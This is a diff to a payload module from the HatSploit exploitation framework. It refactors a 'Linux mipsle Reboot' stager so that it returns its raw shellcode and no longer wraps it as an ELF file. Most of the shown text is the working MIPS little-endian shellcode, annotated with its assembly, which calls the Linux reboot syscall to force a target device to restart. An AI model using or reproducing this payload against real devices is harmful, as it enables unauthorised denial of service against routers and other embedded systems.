@@ -5,11 +5,10 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux mipsle Reboot",
@@ -28,7 +27,7 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        shellcode = (
+        return (
             b"\x21\x43\x06\x3c"  # lui     a2,0x4321
             b"\xdc\xfe\xc6\x34"  # ori     a2,a2,0xfedc
             b"\x12\x28\x05\x3c"  # lui     a1,0x2812
@@ -38,6 +37,3 @@ class HatSploitPayload(Payload, HatVenom):
             b"\xf8\x0f\x02\x24"  # li      v0,4088
             b"\x0c\x01\x01\x01"  # syscall 0x40404
         )
-
-        payload = self.generate('elf', 'mipsle', shellcode)
-        return payload
